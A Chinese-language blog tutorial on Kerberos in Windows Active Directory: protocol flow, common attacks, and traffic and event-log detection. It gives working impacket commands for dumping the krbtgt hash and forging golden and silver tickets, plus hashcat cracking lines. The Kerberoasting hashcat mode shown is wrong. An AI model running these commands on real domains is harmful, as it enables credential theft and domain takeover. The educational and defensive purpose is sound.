---
title: kerberos基础知识以及攻击面
tags: [kerberos, AD, 金票, 银票, kerberosting]
categories: 渗透基础
date: 2021-11-04 15:47:43
---

kerberos基础知识以及攻击面
<!-- more -->
## Kerberos历史

kerberos是由MIT为雅典娜项目开发，整个项目目标是为了整合sso、network file systems、A unified graphical environment、naming convention service，从而达到学生和教职工能随时访问MIT的一万多台工作站。其中kerberos主要是为了解决其中的sso认证的问题

kerberos是使用1978年的Needham-schroeder symmetric key protocol协议为基础。目前的kerberos协议是V5版本，并于1993年发布（2005年更新）。

相比于kerberosV4在kerberosV5版本中添加了以下功能：

* 预认证
* 基于ASN.1的在线协议
* 改变成加盐算法
* 委派
* 支持转发、更新和过期票据
* 重放缓存
* 支持跨域认证
* 可扩展加密类型

## windows中的kerberos

windows主机相关认证体系

![58E92748-7F9B-4C4A-AC70-AC336EDB95D1](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/58E92748-7F9B-4C4A-AC70-AC336EDB95D1.JPG)

在windows中，所有应用层服务的认证都是通过lsass进行的，kerberos、ntlm等网络认证服务都是通过SSPI（windows主机）/GSSAPI(windows服务器)来对LSASS和网络主机提供认证服务。SSP层的各个认证协议在windows中都是以动态链接库存在，并链接着lsass.exe。

windows中主要提供以下ssp

* NTLM
* Kerberos
* Negotiate
* Secure channel（SChannel）
* Digest SSP
* Credential（CredSSP）
* Distributed Password Authentication（DPA）
* Public key Cryptography User-to-User（PKU2U）

## kerberos详解

### kerberos预认证

旨在发出KRB_AS_REP消息识别主体之前判断主体的身份。默认情况下，windows域要求在KRB_AS_REQ消息中提供身份验证数据，这在KDC中默认要求所有用户使用的预身份验证机制。kerberos规范本身使用Pre-Authentication标头在TGS-REQ步骤中传递身份验证数据。kerberos预认证主要是防止用户密码爆破。

### 认证流程

![image-20211104142740922](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142740922.png)

此流程图是有PAC认证的情况下的流程图，通过此流程图可以看见整个kerberos认证的流程。KDC中主要包含AS（Authentication Service）和TGS（Ticket Granting Service）。

#### AS-REQ

下面分别是认证的流程图和认证数据包。

![image-20211104142800246](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142800246.png)



![image-20211101212034419](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212034419.png)

在padate中

* KRB5-PADATA-ENC-TIMESTAMP是用户hash加密的时间戳，AS服务器通过用户hash进行解密来获取时间戳，如果时间戳在一定范围内，就验证通过。而PA-PAC-REQUEST主要是为了设置PAC（Privilege Attribute Certificate）扩展。

在req-body中

* cname是请求的用户名，用户名存在与否，返回包是有差异的。（用户名枚举攻击）

* sname是请求的服务名，通常是krbtgt或者localrealm

* nonce是随机生成的一个数，有的工具可以通过此特征作为ioc
* address是客户端的网络名

#### AS-REP



![image-20211104142818286](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142818286.png)





![image-20211101212111049](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212111049.png)

as-rep

* ticket用于TGS-REQ的认证，其中enc-part是通过kebtgt的hash进行加密的，其中包含session key和PAC等。（黄金票据）

* 另一个enc-part是可以解密的，key是用户的hash，解密后是Encryptionkey，Encryptionkey中包含session key和nonce等，其中的session key是下一个阶段的认证密钥。（AS-REPRoastin）

完成此步骤后，用户的内存中就已经保存TGT了，后续访问各种服务，只需要生成特定的TGS就行。

#### TGS-REQ

![image-20211104142837594](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142837594.png)



![image-20211101212150625](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212150625.png)



![image-20211101212213208](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212213208.png)

padate 

* KRB5-PADATA-REQ的值是使用TGT和KRB_AP_REQ的checksum生成的

ticket

* 上个阶段生成的TGT。

sname

* req-body中的sname主要你需要请求的在SPN中的服务，为了后续生成针对此服务的TGS。

enc-authorization-data

* 此部分首先通过sub-session key加密，如果没有就通过session key进行加密，其中主要包含username和timestamp。

#### TGS-REP



![image-20211104142851770](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142851770.png)



![image-20211101212234043](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101212234043.png)

tgs-rep

* ticket中的enc-part部分是使用服务自身的hash进行加密，其中包含service session key、username、PAC等（白银票据、kerberosting）

* 后续的enc-part部分是使用上个阶段的session key进行的加密，解密后得到encryptionkey，而encryptionkey中最重要的是其中的service session key。

#### AP-REQ

![image-20211104142913324](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104142913324.png)



![image-20211101213730623](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101213730623.png)

![image-20211101213750134](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101213750134.png)

ap-req

* ticket中主要是之前生成的tgs票据。
* authenticator主要是用service session key加密的username和timestamp、initial sequence。

#### AP-REP

![image-20211101213825277](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211101213825277.png)

ap-rep

* 其中的enc-part是用etype加密的，其中包含ctime、cusec、sub-session key、initial sequence

### 相关攻击

![image-20211104165307466](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104165307466.png)

#### 用户名枚举

当用户存在，但是密码错误是，kerberos会返回KDC_ERR_PREAUTH_FAILED，但是当用户名不存在时，会返回KDC_ERR_C_PRINCIPAL_UNKNOWN。基于此，能在域外对域内的用户进行用户名爆破。

流量：对一个用户检测一次就需要发送两个KRB5数据包（两个AS-REQ包，预认证+认证）。

因此总的发包数就是2N个流量包（N是爆破用户数）

#### Password Spraying（密码喷射）

此漏洞基于kerberos认证中，当密码错误时，会产生以下回显，密码正确是能直接获取tgt。

![image-20211103105528022](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211103105528022.png)

发送AS-REQ时，会返回KRB Error：KRB5KDC_ERR_PREAUTH_FAILED，基于这个返回，就能进行域用户密码爆破。

可以先通过LDAP收集用户名，然后通过固定密码来爆破域内其他账户。也可以配合之前的用户名枚举来撕开一个进入内网的口子。

流量：和上面的原因一样，也是2N个流量包。

#### AS-REPRoasting（离线爆破明文密码）

在用户开启，Dot not require Kerberos preauthentication时，即在域中设置了不要求Kerberos 预身份认证。在不进行预认证的情况下，能在获取用户tgt后，对tgt中的ticket hash进行爆破。

![image-20211103105925028](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211103105925028.png)

一、首先进行LDAP查询，查询域内设置了不需要预认证的用户

查询语法：`(&(&(UserAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(!(objectCategory=computer)))`

此阶段一共发送三个数据包（2个NTLM认证+1个LDAP认证）

impacket命令：`python GetNPUsers.py windows.local/windows -dc-ip 172.16.178.9 -format hashcat`

二、在没有开启预认证的情况下，发送一个AS-REQ包就能获取到一个AS-REP包，通过对REP包中加密的部分通过hashcat进行爆破来获取用户密码。

此阶段发送一个AS-REQ包

流量：总共需要发送4N个网络流量包

hashcat命令：`hashcat -m 18200 --force -a 0 上面的hash password.txt`

#### 黄金票据

在用户拥有krbtgt用户的hash后，能通过此hash伪造任意的ticket。从而访问任意域内任意主机的任意服务。

一、获取krbtgt hash

获取特定用户的hash，此处是通过域管用户的hash来获取krbtgt用户的hash。

impacket命令：`python secretsdump.py windows.local/windows@172.16.178.9 -hashes 0:9e7620e4e1a34c1fdcf3228896dc9d22 -dc-ip 172.16.178.9 -just-dc-user krbtgt`

二、获取域的SID

获取SID

impacket命令：`python lookupsid.py windows.local/windows@172.16.178.9 -hashes 0:9e7620e4e1a34c1fdcf3228896dc9d22`

三、形成金票

impacket命令：`python ticketer.py -nthash ed7879d3854f9d4958533d84d7945d9f -domain-sid S-1-5-21-4142917197-1339067896-309211218 -domain windows.local test`

其中，nthash需要是前面获取的krbtgt hash的nt hash，最后的test需要是域内的用户

四、使用金票

`export KRB5CCNAME=/Users/impacket-master/examples/test.ccache;python psexec.py windows.local/test@TEST.windows.local -k -no-pass -dc-ip 172.16.178.9 -debug`

注意：

* export后是导入的金票

* 域的用户名必须是形成金票的名字

* 目标一定要是具体的机器名，如果在域外，就配置hosts，因为KDC下发tgs前会用SPN查询你的具体机器名，如果是ip就会查不到。
* 如何是域外，需要加-dc-ip或者host中配置域控的ip，域内就不需要。

流量：正常的kerberos访问流量，除了没有tgt获取阶段。

#### kerberosting

此漏洞主要是通过获取服务用户的TGS，获取完成后爆破TGS使用服务hash加密的ticket。

通过SPN查询域内服务用户.

impacket命令：`python GetUserSPNs.py windows.local/windows:xxxxxxx -request -dc-ip 172.16.178.9`

爆破服务用户获取到的tgs-rep密码.

hashcat命令：`hashcat -m 18200 --force -a 0 上面的hash password.txt`

流量：4N

#### 白银票据

当拥有服务hash后，通过此服务hash生成TGS，此过程不用访问DC，攻击机器只与目标服务器通信。如果目标服务有PAC认证，则此票据将失效。

一、获取具体服务用户hash

`python secretsdump.py windows.local/windows@172.16.178.9 -hashes 0:9e7620e4e1a34c1fdcf3228896dc9d22 -dc-ip 172.16.178.9 -just-dc-user test`

二、获取SID

`python lookupsid.py windows.local/windows@172.16.178.9 -hashes 0:9e7620e4e1a34c1fdcf3228896dc9d22`

三、形成票据

`python ticketer.py -nthash 4d6bb8456fde083dcdc9a23c6c7c1425 -domain-sid S-1-5-21-4142917197-1339067896-309211218 -domain windows.local -spn http/web.windows.local(service name/host) web(username)`

四、使用银票

`export KRB5CCNAME=/Users/impacket-master/examples/test.ccache;python wmiexec.py windows.local/test@test.windows.local -k -no-pass -debug`

流量：此攻击方法的流量相比于正常的流量少了tgs和tgt获取过程。

## 对抗

### 流量层

此处的对抗主要是通过impacket进行的，如果是其他的工具，可以也可以用此思路来检测。

通过抓取impacket的数据包，可以看见

![image-20211104162725971](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104162725971.png)

下面是我默认域环境下的认证包

![image-20211104162810225](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104162810225.png)



域默认环境的till时间是2037年的09月13日，而impacket的till时间是大概半天后，如果在流量层加此规则，就能筛选出impacket中进行tgt和tgs获取的流量包。从而检测出绝大多数kerberos相关的攻击。

### 主机层

主机层的防御很多都和windows的事件记录器相关，下面是通过kerberos进行登陆的事件。正常情况下，DC的windows事件中，没有这三个连续的事件，通过筛选出这三个连续的事件来确认关键服务器是否被攻击。

![image-20211104103026660](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104103026660.png)

进一步查看4624号事件，可以看见如果kerberos的票据通过smb、wmi、psexec等方式登陆成功后，IpAddress中会显示出具体的IPV4地址。

![image-20211104103129919](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104103129919.png)

如果登陆失败，则会显示一个ipV6地址。

![image-20211104103106607](https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104103106607.png)



## 参考文献

Kerberos RFC ：https://datatracker.ietf.org/doc/html/rfc1510

blog：https://www.tarlogic.com/blog/how-kerberos-works/

​      https://daiker.gitbook.io/windows-protocol/

microsoft：https://docs.microsoft.com/en-us/windows/win32/secauthn/basic-authentication-concepts

